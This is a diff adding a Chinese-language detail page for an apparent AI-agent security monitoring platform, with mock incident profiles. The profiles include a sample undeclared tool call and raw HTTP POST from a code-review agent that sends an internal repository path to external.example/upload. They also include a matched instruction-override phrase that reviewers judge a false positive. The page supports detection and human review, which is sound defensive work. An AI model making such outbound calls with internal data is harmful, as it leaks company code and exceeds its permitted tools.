@@ -1,0 +1,610 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <title>风险事件详情</title>
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .detail-layout { display: grid; grid-template-columns: 1fr 360px; gap: 16px; align-items: start; }
+    .evidence-tabs { display: flex; gap: 8px; border-bottom: 1px solid #EBEEF5; margin: 12px 0; }
+    .evidence-tab { padding: 8px 10px; border-radius: 4px 4px 0 0; color: #606266; cursor: pointer; }
+    .evidence-tab.active { color: #409EFF; background: #ECF5FF; font-weight: 600; }
+    .evidence-box { background: #F5F7FA; border: 1px solid #EBEEF5; border-radius: 4px; padding: 12px; line-height: 1.8; min-height: 140px; }
+    .evidence-code { white-space: pre; overflow: auto; max-height: 300px; font-family: Consolas, "Courier New", monospace; }
+    .context-preview { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 10px; }
+    .context-item { border: 1px solid #EBEEF5; border-radius: 4px; padding: 10px; min-width: 0; }
+    .context-stage { color: #909399; margin-bottom: 6px; font-size: 12px; }
+    .context-text { color: #303133; line-height: 1.7; }
+    .evidence-mark { background: #FFF0F0; color: #D93026; padding: 1px 3px; border-radius: 3px; }
+    .action-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+    .ai-status-row { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px; }
+    .ai-card-section { border-bottom: 1px solid #EBEEF5; padding-bottom: 12px; margin-bottom: 12px; }
+    .ai-card-section:last-child { border-bottom: 0; padding-bottom: 0; margin-bottom: 0; }
+    .ai-summary-title { color: #303133; font-weight: 600; margin-bottom: 8px; }
+    .ai-metric-grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 8px; }
+    .ai-metric { background: #F5F7FA; border: 1px solid #EBEEF5; border-radius: 4px; padding: 8px; min-width: 0; }
+    .ai-metric-label { color: #909399; font-size: 12px; margin-bottom: 4px; }
+    .ai-metric-value { color: #303133; font-weight: 600; word-break: break-all; }
+    .ai-list { margin: 0; padding-left: 18px; color: #606266; line-height: 1.8; }
+    .ai-fragment { border: 1px solid #F5D0D0; background: #FFF7F7; border-radius: 4px; padding: 8px; margin-top: 8px; }
+    .similar-event { border: 1px solid #EBEEF5; border-radius: 4px; padding: 10px; margin-top: 8px; }
+    .similar-event-title { display: flex; justify-content: space-between; gap: 8px; color: #303133; font-weight: 600; }
+    .similar-event-meta { color: #909399; font-size: 12px; margin-top: 6px; line-height: 1.6; }
+    .mono { font-family: Consolas, "Courier New", monospace; }
+    @media (max-width: 1400px) {
+      .detail-layout { grid-template-columns: 1fr; }
+      .context-preview { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+    }
+  </style>
+</head>
+<body class="page-content">
+  <div class="sub-page">
+    <div class="page-header">
+      <div>
+        <div class="page-title">风险事件详情 <span id="riskLevelTag" class="tag tag-danger">高风险</span> <span id="statusTag" class="tag tag-warning">处理中</span></div>
+        <div class="ai-status-row">
+          <span id="detectionSourceTag" class="tag tag-primary">规则+AI检出</span>
+          <span id="aiStatusTag" class="tag tag-success">AI检测成功</span>
+          <span id="aiAnalysisStatusTag" class="tag tag-primary">AI研判已生成</span>
+          <span id="confidenceReviewTag" class="tag tag-warning" style="display:none;">低置信待复核</span>
+        </div>
+        <div class="page-subtitle" id="pageSubtitle">EVT-2026-00018 | trace_id: TRC-20260416-018 | span_id: sp_04_tool | risk_stage: 工具能力边界确认</div>
+      </div>
+      <div style="display:flex;gap:8px;">
+        <button class="btn btn-default" onclick="backToList()">返回列表</button>
+        <button class="btn btn-primary" onclick="goTrace()">查看风险溯源</button>
+      </div>
+    </div>
+
+    <div class="detail-layout">
+      <div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">事件概况</div></div>
+          <div class="card-body">
+            <div class="desc-list">
+              <div class="desc-item"><div class="desc-label">事件编号</div><div class="desc-value mono" id="eventId">EVT-2026-00018</div></div>
+              <div class="desc-item"><div class="desc-label">发生时间</div><div class="desc-value" id="eventTime">2026-04-16 10:25:33</div></div>
+              <div class="desc-item"><div class="desc-label">风险类型</div><div class="desc-value" id="riskType">工具能力边界越界</div></div>
+              <div class="desc-item"><div class="desc-label">置信度</div><div class="desc-value" id="confidence">0.91</div></div>
+              <div class="desc-item"><div class="desc-label">检测来源</div><div class="desc-value" id="detectionSource">规则+AI联合检出</div></div>
+              <div class="desc-item"><div class="desc-label">AI检测状态</div><div class="desc-value" id="aiStatus">success</div></div>
+              <div class="desc-item"><div class="desc-label">AI研判状态</div><div class="desc-value" id="aiAnalysisStatus">generated</div></div>
+              <div class="desc-item"><div class="desc-label">AI置信等级</div><div class="desc-value" id="aiConfidenceLevel">高</div></div>
+              <div class="desc-item"><div class="desc-label">标准风险阶段</div><div class="desc-value" id="riskStage">工具能力边界确认</div></div>
+              <div class="desc-item"><div class="desc-label">事件状态</div><div class="desc-value" id="eventStatus"><span class="tag tag-warning">处理中</span></div></div>
+              <div class="desc-item"><div class="desc-label">关联应用</div><div class="desc-value" id="appName">研发代码审查助手</div></div>
+              <div class="desc-item"><div class="desc-label">所属部门</div><div class="desc-value" id="deptName">研发部</div></div>
+              <div class="desc-item"><div class="desc-label">关联智能体</div><div class="desc-value" id="agentName">代码审查工作流 / ReviewChain.invoke</div></div>
+              <div class="desc-item"><div class="desc-label">关联工具</div><div class="desc-value" id="toolName">external_http_post</div></div>
+              <div class="desc-item"><div class="desc-label">关联资源</div><div class="desc-value" id="resourceName">external.example/upload</div></div>
+              <div class="desc-item"><div class="desc-label">平台动作</div><div class="desc-value" id="platformAction"><span class="tag tag-warning">已建议限制</span></div></div>
+              <div class="desc-item"><div class="desc-label">检测器</div><div class="desc-value" id="detectorName">tool-boundary-detector</div></div>
+              <div class="desc-item"><div class="desc-label">规则版本</div><div class="desc-value mono" id="ruleVersion">tool-boundary-v1.8.2</div></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title">上下文预览</div><span class="tag tag-primary">上下文片段</span></div>
+          <div class="card-body">
+            <div class="context-preview" id="contextPreview"></div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title">证据工作区</div><span class="tag tag-success" id="redactionTag">已脱敏</span></div>
+          <div class="card-body">
+            <div class="alert-box alert-warning"><span class="alert-icon">!</span><span id="evidenceFinding">检测到未声明工具发起外联数据流，Tool Input 中包含内部仓库路径片段。</span></div>
+            <div class="evidence-tabs">
+              <div class="evidence-tab active" onclick="switchEvidenceTab(this,'summary')">证据摘要</div>
+              <div class="evidence-tab" onclick="switchEvidenceTab(this,'json')">格式化 JSON</div>
+              <div class="evidence-tab" onclick="switchEvidenceTab(this,'ai')">AI检测结果</div>
+              <div class="evidence-tab" onclick="switchEvidenceTab(this,'raw')">Raw 授权</div>
+              <div class="evidence-tab" onclick="switchEvidenceTab(this,'rule')">规则解释</div>
+            </div>
+            <div class="evidence-box"><pre class="evidence-code" id="evidenceCode"></pre></div>
+            <div class="form-hint" id="evidenceMeta" style="margin-top:8px;">source_field: tool.input | evidence_offset: 63-89 | raw_ref: minio://agentsec/raw/2026/04/16/sp_04_tool.json</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title">处置记录</div></div>
+          <div class="card-body"><div class="timeline" id="eventTimeline"></div></div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title">动作与审批台账</div><span class="tag tag-primary">action_id / approval_id</span></div>
+          <div class="table-wrapper">
+            <table class="data-table">
+              <thead><tr><th>action_id</th><th>动作类型</th><th>action_status</th><th>rollback_status</th><th>TTL</th><th>approval_id</th><th>操作人</th></tr></thead>
+              <tbody id="actionLedgerBody"></tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title">状态变更记录</div></div>
+          <div class="table-wrapper">
+            <table class="data-table">
+              <thead><tr><th>时间</th><th>变更前</th><th>变更后</th><th>变更人</th><th>说明</th></tr></thead>
+              <tbody id="statusHistoryBody"></tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title">处置结论</div></div>
+          <div class="card-body">
+            <div class="desc-list">
+              <div class="desc-item"><div class="desc-label">处置说明</div><div class="desc-value" id="fpReason">暂无，当前事件已确认进入处理中。</div></div>
+              <div class="desc-item"><div class="desc-label">风险接受说明</div><div class="desc-value" id="acceptReason">暂无，如业务确认接受风险需关联审批编号。</div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">AI辅助研判</div><span id="aiJudgementBadge" class="tag tag-primary">generated</span></div>
+          <div class="card-body">
+            <div class="ai-card-section">
+              <div class="ai-summary-title" id="aiAttackMethod">工具能力边界越界</div>
+              <div class="ai-metric-grid">
+                <div class="ai-metric"><div class="ai-metric-label">置信等级</div><div class="ai-metric-value" id="aiJudgementConfidence">高</div></div>
+                <div class="ai-metric"><div class="ai-metric-label">处置优先级</div><div class="ai-metric-value" id="aiPriority">high</div></div>
+                <div class="ai-metric"><div class="ai-metric-label">模型版本</div><div class="ai-metric-value mono" id="aiModelVersion">sec-judge-v1.2</div></div>
+                <div class="ai-metric"><div class="ai-metric-label">Prompt版本</div><div class="ai-metric-value mono" id="aiPromptVersion">judge-prompt-v0.8</div></div>
+              </div>
+            </div>
+            <div class="ai-card-section">
+              <div class="ai-summary-title">影响面评估</div>
+              <div id="aiImpact" style="color:#606266;line-height:1.8;"></div>
+            </div>
+            <div class="ai-card-section">
+              <div class="ai-summary-title">判断理由</div>
+              <ul class="ai-list" id="aiReasons"></ul>
+            </div>
+            <div class="ai-card-section">
+              <div class="ai-summary-title">不确定性</div>
+              <div class="form-hint">缺失证据</div>
+              <ul class="ai-list" id="aiMissingEvidence"></ul>
+              <div class="form-hint" style="margin-top:8px;">需人工补充的问题</div>
+              <ul class="ai-list" id="aiOpenQuestions"></ul>
+            </div>
+            <div style="display:flex;gap:8px;flex-wrap:wrap;">
+              <button class="btn btn-primary" onclick="submitAiFeedback('confirmed')">确认研判</button>
+              <button class="btn btn-default" onclick="openModal('aiFeedbackModal')">修正</button>
+              <button class="btn btn-default" onclick="submitAiFeedback('rejected')">拒绝</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title">相似事件</div><span class="tag tag-info">仅供参考</span></div>
+          <div class="card-body" id="similarEventsBody"></div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title">处置动作</div></div>
+          <div class="card-body">
+            <div class="action-grid">
+              <button class="btn btn-default" onclick="openModal('assignModal')">指派负责人</button>
+              <button class="btn btn-warning" onclick="openModal('actionModal')">下发限制</button>
+              <button class="btn btn-info" onclick="openModal('falsePositiveModal')">标记误报</button>
+              <button class="btn btn-default" onclick="openModal('acceptRiskModal')">接受风险</button>
+              <button class="btn btn-primary" onclick="openModal('progressModal')">处置登记</button>
+              <button class="btn btn-default" onclick="toastSuccess('事件摘要已生成')">生成摘要</button>
+            </div>
+            <hr class="divider">
+            <div class="alert-box alert-warning"><span class="alert-icon">!</span><span id="actionHint">当前建议优先限制 Tool 范围，避免直接影响整个应用。</span></div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title">审计要求</div></div>
+          <div class="card-body">
+            <ul style="color:#606266;line-height:1.9;padding-left:18px;list-style:disc;">
+              <li>状态变更、指派、限制、误报和接受风险都必须留痕。</li>
+              <li>误报必须填写原因，可进入规则优化样本。</li>
+              <li>接受风险必须关联业务负责人审批和有效期。</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="progressModal">
+    <div class="modal-box modal-md">
+      <div class="modal-header"><div class="modal-title">事件处置登记</div><div class="modal-close" onclick="closeModal('progressModal')">×</div></div>
+      <div class="modal-body"><form id="progressForm">
+        <div class="form-row"><div class="form-label required">处置状态</div><div class="form-field">
+          <select class="form-select" required>
+            <option value="">请选择处置状态</option>
+            <option value="resolved">已处置</option>
+            <option value="false_positive">误报</option>
+            <option value="accepted_risk">接受风险</option>
+            <option value="closed">已关闭</option>
+          </select>
+        </div></div>
+        <div class="form-row"><div class="form-label required">处置备注</div><div class="form-field"><textarea class="form-textarea" required placeholder="说明处置过程、判断依据等"></textarea></div></div>
+      </form></div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('progressModal')">取消</button><button class="btn btn-primary" onclick="submitModal('progressForm','progressModal','处置进度已更新并写入审计')">提交登记</button></div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="assignModal">
+    <div class="modal-box modal-md">
+      <div class="modal-header"><div class="modal-title">指派负责人</div><div class="modal-close" onclick="closeModal('assignModal')">×</div></div>
+      <div class="modal-body"><form id="assignForm">
+        <div class="form-row"><div class="form-label required">负责人</div><div class="form-field"><select class="form-select" required><option value="">请选择负责人</option><option>张安全</option><option>李运营</option><option>王合规</option><option>赵研发</option></select></div></div>
+        <div class="form-row"><div class="form-label">备注</div><div class="form-field"><textarea class="form-textarea" placeholder="说明指派原因或协作要求"></textarea></div></div>
+      </form></div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('assignModal')">取消</button><button class="btn btn-primary" onclick="submitModal('assignForm','assignModal','负责人已更新并写入审计')">确认指派</button></div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="actionModal">
+    <div class="modal-box modal-md">
+      <div class="modal-header"><div class="modal-title">下发限制动作</div><div class="modal-close" onclick="closeModal('actionModal')">×</div></div>
+      <div class="modal-body"><form id="actionForm">
+        <div class="form-row"><div class="form-label required">范围</div><div class="form-field"><select class="form-select" id="actionScope" required><option>Tool: external_http_post</option><option>Agent: 研发代码审查助手</option><option>App: app_rd_code_review</option></select></div></div>
+        <div class="form-row"><div class="form-label required">TTL</div><div class="form-field"><select class="form-select" required><option>1 小时</option><option>6 小时</option><option>24 小时</option></select></div></div>
+        <div class="form-row"><div class="form-label required">审批编号</div><div class="form-field"><input class="form-control" required placeholder="输入审批单号或 MFA 验证码"></div></div>
+        <div class="form-row"><div class="form-label">备注</div><div class="form-field"><textarea class="form-textarea" placeholder="说明限制依据和影响范围"></textarea></div></div>
+      </form></div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('actionModal')">取消</button><button class="btn btn-warning" onclick="submitModal('actionForm','actionModal','限制动作已下发并写入审计')">确认下发</button></div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="falsePositiveModal">
+    <div class="modal-box modal-md">
+      <div class="modal-header"><div class="modal-title">标记误报</div><div class="modal-close" onclick="closeModal('falsePositiveModal')">×</div></div>
+      <div class="modal-body"><form id="fpForm">
+        <div class="form-row"><div class="form-label required">误报原因</div><div class="form-field"><select class="form-select" required><option value="">请选择原因</option><option>测试数据或演练数据</option><option>业务允许的工具调用</option><option>规则阈值过严</option><option>上下文缺失导致误判</option></select></div></div>
+        <div class="form-row"><div class="form-label">样本处理</div><div class="form-field"><select class="form-select"><option>进入规则优化样本池</option><option>仅记录本次结论</option></select></div></div>
+        <div class="form-row"><div class="form-label required">说明</div><div class="form-field"><textarea class="form-textarea" required placeholder="说明误报判断依据"></textarea></div></div>
+      </form></div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('falsePositiveModal')">取消</button><button class="btn btn-primary" onclick="submitModal('fpForm','falsePositiveModal','已标记误报并写入审计')">提交</button></div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="acceptRiskModal">
+    <div class="modal-box modal-md">
+      <div class="modal-header"><div class="modal-title">接受风险审批记录</div><div class="modal-close" onclick="closeModal('acceptRiskModal')">×</div></div>
+      <div class="modal-body"><form id="acceptForm">
+        <div class="form-row"><div class="form-label required">审批编号</div><div class="form-field"><input class="form-control" required placeholder="如 APR-20260416-003"></div></div>
+        <div class="form-row"><div class="form-label required">有效期</div><div class="form-field"><select class="form-select" required><option>7 天</option><option>30 天</option><option>90 天</option></select></div></div>
+        <div class="form-row"><div class="form-label required">接受原因</div><div class="form-field"><textarea class="form-textarea" required placeholder="说明业务原因、补偿控制和到期复核安排"></textarea></div></div>
+      </form></div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('acceptRiskModal')">取消</button><button class="btn btn-primary" onclick="submitModal('acceptForm','acceptRiskModal','接受风险记录已提交并写入审计')">提交</button></div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="aiFeedbackModal">
+    <div class="modal-box modal-md">
+      <div class="modal-header"><div class="modal-title">修正 AI 研判</div><div class="modal-close" onclick="closeModal('aiFeedbackModal')">×</div></div>
+      <div class="modal-body"><form id="aiFeedbackForm">
+        <div class="form-row"><div class="form-label required">修正后的攻击手法</div><div class="form-field"><input class="form-control" required id="aiFeedbackAttack" placeholder="如：工具能力边界越界"></div></div>
+        <div class="form-row"><div class="form-label required">处置优先级</div><div class="form-field"><select class="form-select" required><option>critical</option><option selected>high</option><option>medium</option><option>low</option></select></div></div>
+        <div class="form-row"><div class="form-label required">修正后的影响面</div><div class="form-field"><textarea class="form-textarea" required placeholder="说明影响对象、影响范围和可能后果"></textarea></div></div>
+        <div class="form-row"><div class="form-label required">修正原因</div><div class="form-field"><textarea class="form-textarea" required placeholder="说明 AI 判断中需要修正或补充的部分"></textarea></div></div>
+        <div class="form-row"><div class="form-label">样本处理</div><div class="form-field"><select class="form-select"><option>进入样本候选集</option><option>仅记录反馈</option></select></div></div>
+        <div class="form-row"><div class="form-label">样本类型</div><div class="form-field"><select class="form-select"><option>命中样本</option><option>误报样本</option><option>攻击样本</option><option>边界样本</option></select></div></div>
+      </form></div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('aiFeedbackModal')">取消</button><button class="btn btn-primary" onclick="submitAiCorrection()">提交修正</button></div>
+    </div>
+  </div>
+
+  <script src="../../js/common.js"></script>
+  <script>
+    var activeEvidenceTab = 'summary';
+    var currentEvent = null;
+    var eventProfiles = {
+      'EVT-2026-00018': {
+        id: 'EVT-2026-00018',
+        time: '2026-04-16 10:25:33',
+        traceId: 'TRC-20260416-018',
+        spanId: 'sp_04_tool',
+        riskLevel: '高风险',
+        riskTag: 'tag-danger',
+        status: '处理中',
+        statusTag: 'tag-warning',
+        riskType: '工具能力边界越界',
+        confidence: '0.91',
+        riskStage: '工具能力边界确认',
+        app: '研发代码审查助手',
+        dept: '研发部',
+        agent: '代码审查工作流 / ReviewChain.invoke',
+        tool: 'external_http_post',
+        resource: 'external.example/upload',
+        action: '<span class="tag tag-warning">已建议限制</span>',
+        detector: 'tool-boundary-detector',
+        rule: 'tool-boundary-v1.8.2',
+        source: 'tool.input',
+        offset: '63-89',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_04_tool.json',
+        finding: '检测到未声明工具发起外联数据流，Tool Input 中包含内部仓库路径片段。',
+        context: ['用户提交代码审查任务，要求检查配置文件和网络调用。', '模型计划调用 repo_reader 与 external_http_post。', 'Tool Input 包含 external.example/upload 与 repo_path=internal/payment。', '响应输出包含内部仓库路径摘要，已脱敏。'],
+        json: '{\n  "span_id": "sp_04_tool",\n  "source_field": "tool.input",\n  "tool_name": "external_http_post",\n  "input": {\n    "url": "https://external.example/upload",\n    "payload": {\n      "repo_path": "internal/payment",\n      "reason": "code review context"\n    }\n  }\n}',
+        raw: 'POST /upload HTTP/1.1\nHost: external.example\n\n{"repo_path":"internal/payment","reason":"code review context"}',
+        actions: [
+          { id: 'ACT-20260416-0018', type: 'restrict_tool', status: 'pending_approval', rollback: 'not_started', ttl: '6h', approval: 'APR-20260416-003', operator: '张安全' }
+        ],
+        statusHistory: [
+          { time: '2026-04-16 10:25:33', from: '-', to: '待确认', operator: '检测引擎', note: '命中工具能力边界规则并生成事件' },
+          { time: '2026-04-16 10:31:08', from: '待确认', to: '处理中', operator: '张安全', note: '人工确认风险，等待限制动作审批' }
+        ],
+        ruleText: '规则 tool-boundary-v1.8.2：应用未声明外部 HTTP POST 能力，但 Span 中出现 external_http_post 工具调用，并携带内部资源路径时，进入工具能力边界复核。',
+        fpReason: '暂无，当前事件已确认进入处理中。',
+        acceptReason: '暂无，如业务确认接受风险需关联审批编号。',
+        hint: '当前建议优先限制 Tool 范围，避免直接影响整个应用。'
+      },
+      'EVT-2026-00012': {
+        id: 'EVT-2026-00012',
+        time: '2026-04-16 09:48:11',
+        traceId: 'TRC-20260416-012',
+        spanId: 'sp_06_output',
+        riskLevel: '中风险',
+        riskTag: 'tag-warning',
+        status: '已确认',
+        statusTag: 'tag-warning',
+        riskType: '敏感数据输出',
+        confidence: '0.84',
+        riskStage: '响应输出复核',
+        app: '人事档案助理',
+        dept: '人力资源部',
+        agent: '档案查询 Agent / ProfileReader.answer',
+        tool: 'hr_profile_reader',
+        resource: 'employee_profile',
+        action: '<span class="tag tag-info">已通知</span>',
+        detector: 'response-sensitive-detector',
+        rule: 'response-sensitive-v2.4.0',
+        source: 'llm.response',
+        offset: '118-146',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_06_output.json',
+        finding: '响应输出中包含员工手机号片段，已脱敏展示，原文需要授权后查看。',
+        context: ['用户要求汇总候选员工联系信息。', '工具返回员工档案字段，包含手机号和部门。', '模型响应未完全压缩敏感字段。', '检测器对手机号片段进行脱敏展示。'],
+        json: '{\n  "span_id": "sp_06_output",\n  "source_field": "llm.response",\n  "output_excerpt": "员工联系方式：[PHONE_MASKED]",\n  "redaction_state": "redacted"\n}',
+        raw: 'LLM RESPONSE\n员工联系方式：[PHONE_MASKED]，部门：运营中心。原文已脱敏，需授权查看。',
+        actions: [
+          { id: 'ACT-20260416-0012', type: 'mask_output', status: 'succeeded', rollback: 'not_supported', ttl: '24h', approval: 'APR-20260416-001', operator: '王合规' }
+        ],
+        statusHistory: [
+          { time: '2026-04-16 09:58:12', from: '-', to: '待确认', operator: '检测引擎', note: '命中敏感输出规则' },
+          { time: '2026-04-16 10:08:44', from: '待确认', to: '已处置', operator: '王合规', note: '输出脱敏策略已生效' }
+        ],
+        ruleText: '规则 response-sensitive-v2.4.0：当模型响应包含手机号、证件号、员工档案字段等敏感信息时，生成敏感输出复核事件。',
+        fpReason: '暂无。',
+        acceptReason: '暂无。',
+        hint: '建议先通知应用负责人确认最小输出字段，必要时调整脱敏策略。'
+      },
+      'EVT-2026-00009': {
+        id: 'EVT-2026-00009',
+        time: '2026-04-16 09:12:04',
+        traceId: 'TRC-20260416-009',
+        spanId: 'sp_02_llm',
+        riskLevel: '低风险',
+        riskTag: 'tag-primary',
+        status: '误报',
+        statusTag: 'tag-info',
+        riskType: '提示词风险',
+        confidence: '0.43',
+        riskStage: '提示词复核',
+        app: '智能客服 Copilot',
+        dept: '客服中心',
+        agent: '客服问答 Agent / ReplyPlanner',
+        tool: 'crm_search',
+        resource: 'customer_ticket',
+        action: '<span class="tag tag-info">仅记录</span>',
+        detector: 'prompt-risk-detector',
+        rule: 'prompt-risk-low-confidence-v1.1',
+        source: 'prompt.input',
+        offset: '24-40',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_02_llm.json',
+        finding: '命中低置信度提示词规则，人工复核后标记为误报样本。',
+        context: ['用户询问售后工单处理进度。', '提示词中出现“忽略之前回复模板”等普通表达。', '规则低置信度命中提示词风险。', '复核认为是业务话术，不构成风险。'],
+        json: '{\n  "span_id": "sp_02_llm",\n  "source_field": "prompt.input",\n  "matched_phrase": "忽略之前回复模板",\n  "confidence": 0.43\n}',
+        raw: 'USER PROMPT\n请忽略之前回复模板，用更简洁的方式告诉客户工单进度。',
+        actions: [
+          { id: 'ACT-20260416-0009', type: 'false_positive', status: 'succeeded', rollback: 'not_required', ttl: '-', approval: '-', operator: '李运营' }
+        ],
+        statusHistory: [
+          { time: '2026-04-16 08:41:20', from: '-', to: '待确认', operator: '检测引擎', note: '低置信度 Prompt 风险命中' },
+          { time: '2026-04-16 09:03:12', from: '待确认', to: '误报', operator: '李运营', note: '结合上下文复核为普通改写需求' }
+        ],
+        ruleText: '规则 prompt-risk-low-confidence-v1.1：疑似覆盖原指令的表达需要结合上下文复核，低置信度命中不应直接触发限制动作。',
+        fpReason: '业务话术触发低置信度规则，已进入规则优化样本池。',
+        acceptReason: '不适用。',
+        hint: '当前事件已标记误报，建议关注规则优化样本即可。'
+      }
+    };
+
+    document.addEventListener('DOMContentLoaded', function() {
+      if (typeof updateBreadcrumb === 'function') {
+        updateBreadcrumb([{ label: '风险事件' }, { label: '风险事件详情' }]);
+      }
+      var id = new URLSearchParams(window.location.search).get('id') || 'EVT-2026-00018';
+      renderEvent(eventProfiles[id] || eventProfiles['EVT-2026-00018']);
+    });
+
+    function renderEvent(profile) {
+      currentEvent = profile;
+      document.getElementById('riskLevelTag').className = 'tag ' + profile.riskTag;
+      document.getElementById('riskLevelTag').textContent = profile.riskLevel;
+      document.getElementById('statusTag').className = 'tag ' + profile.statusTag;
+      document.getElementById('statusTag').textContent = profile.status;
+      document.getElementById('pageSubtitle').textContent = profile.id + ' | trace_id: ' + profile.traceId + ' | span_id: ' + profile.spanId + ' | risk_stage: ' + profile.riskStage;
+      var ai = getAiProfile(profile);
+      ['eventId','eventTime','riskType','confidence','detectionSource','aiStatus','aiAnalysisStatus','aiConfidenceLevel','riskStage','appName','deptName','agentName','toolName','resourceName','detectorName','ruleVersion','evidenceFinding','fpReason','acceptReason','actionHint'].forEach(function(id) {
+        var map = { eventId: 'id', eventTime: 'time', riskType: 'riskType', confidence: 'confidence', detectionSource: 'detectionSourceLabel', aiStatus: 'aiStatus', aiAnalysisStatus: 'analysisStatus', aiConfidenceLevel: 'confidenceLevelLabel', riskStage: 'riskStage', appName: 'app', deptName: 'dept', agentName: 'agent', toolName: 'tool', resourceName: 'resource', detectorName: 'detector', ruleVersion: 'rule', evidenceFinding: 'finding', fpReason: 'fpReason', acceptReason: 'acceptReason', actionHint: 'hint' };
+        if (map[id] in ai) {
+          document.getElementById(id).textContent = ai[map[id]];
+          return;
+        }
+        document.getElementById(id).textContent = profile[map[id]];
+      });
+      renderAiStatusTags(ai);
+      document.getElementById('eventStatus').innerHTML = '<span class="tag ' + profile.statusTag + '">' + profile.status + '</span>';
+      document.getElementById('platformAction').innerHTML = profile.action;
+      document.getElementById('evidenceMeta').textContent = 'source_field: ' + profile.source + ' | evidence_offset: ' + profile.offset + ' | raw_ref: ' + profile.rawRef;
+      document.getElementById('contextPreview').innerHTML = ['触发前文','模型计划','工具/资源','响应输出'].map(function(stage, idx) {
+        return '<div class="context-item"><div class="context-stage">' + stage + '</div><div class="context-text">' + profile.context[idx] + '</div></div>';
+      }).join('');
+      document.getElementById('eventTimeline').innerHTML =
+        '<div class="timeline-item"><div class="timeline-dot red"></div><div class="timeline-content"><div class="timeline-time">' + profile.time + '</div><div class="timeline-text">检测引擎生成风险事件</div><div class="timeline-detail">状态：待确认</div></div></div>' +
+        '<div class="timeline-item"><div class="timeline-dot orange"></div><div class="timeline-content"><div class="timeline-time">2026-04-16 10:31:08</div><div class="timeline-text">负责人复核事件</div><div class="timeline-detail">当前状态：' + profile.status + '</div></div></div>' +
+        '<div class="timeline-item"><div class="timeline-dot gray"></div><div class="timeline-content"><div class="timeline-time">待执行</div><div class="timeline-text">下一步处置或关闭确认</div></div></div>';
+      document.getElementById('actionLedgerBody').innerHTML = (profile.actions || []).map(function(item) {
+        return '<tr><td class="mono">' + item.id + '</td><td>' + item.type + '</td><td><span class="tag tag-warning">' + item.status + '</span></td><td>' + item.rollback + '</td><td>' + item.ttl + '</td><td class="mono">' + item.approval + '</td><td>' + item.operator + '</td></tr>';
+      }).join('');
+      document.getElementById('statusHistoryBody').innerHTML = (profile.statusHistory || []).map(function(item) {
+        return '<tr><td>' + item.time + '</td><td>' + item.from + '</td><td>' + item.to + '</td><td>' + item.operator + '</td><td>' + item.note + '</td></tr>';
+      }).join('');
+      renderAiJudgement(ai);
+      renderSimilarEvents(ai);
+      renderEvidence();
+    }
+
+    function switchEvidenceTab(el, tab) {
+      document.querySelectorAll('.evidence-tab').forEach(function(item){ item.classList.remove('active'); });
+      el.classList.add('active');
+      activeEvidenceTab = tab;
+      renderEvidence();
+    }
+
+    function renderEvidence() {
+      if (!currentEvent) return;
+      var ai = getAiProfile(currentEvent);
+      var content = '结论：' + currentEvent.finding + '\n\n证据锚点：' + currentEvent.traceId + ' / ' + currentEvent.spanId + '\n证据来源：' + currentEvent.source + '\n关联资源：' + currentEvent.resource;
+      if (activeEvidenceTab === 'json') content = currentEvent.json;
+      if (activeEvidenceTab === 'ai') {
+        content =
+          'AI检测状态：' + ai.aiStatus + '\n' +
+          '检测来源：' + ai.detectionSourceLabel + '\n' +
+          '攻击类型：' + ai.attackMethod + '\n' +
+          '风险标签：' + ai.riskTags.join(' / ') + '\n' +
+          '模型版本：' + ai.modelVersion + '\n' +
+          'Prompt模板：' + ai.promptVersion + '\n' +
+          '耗时：' + ai.latencyMs + 'ms | Token：' + ai.tokens + ' | 成本：' + ai.cost + '\n\n' +
+          '命中片段：\n' + ai.hitFragments.map(function(item) {
+            return '- [' + item.field + '] ' + item.text + '（' + item.offset + '）';
+          }).join('\n') + '\n\n' +
+          '判断理由：\n' + ai.reasons.map(function(item) { return '- ' + item; }).join('\n') + '\n\n' +
+          '反例提示：\n' + ai.counterExamples.map(function(item) { return '- ' + item; }).join('\n');
+      }
+      if (activeEvidenceTab === 'raw') content = 'Raw 原文不在普通详情页直接展示。\n\nraw_ref：' + currentEvent.rawRef + '\n授权入口：提交高敏访问审批后，由审计日志记录访问人、审批编号、访问时间和用途。\n建议用途：证据复核、合规抽检或误报申诉。';
+      if (activeEvidenceTab === 'rule') content = currentEvent.ruleText;
+      document.getElementById('evidenceCode').textContent = content;
+    }
+
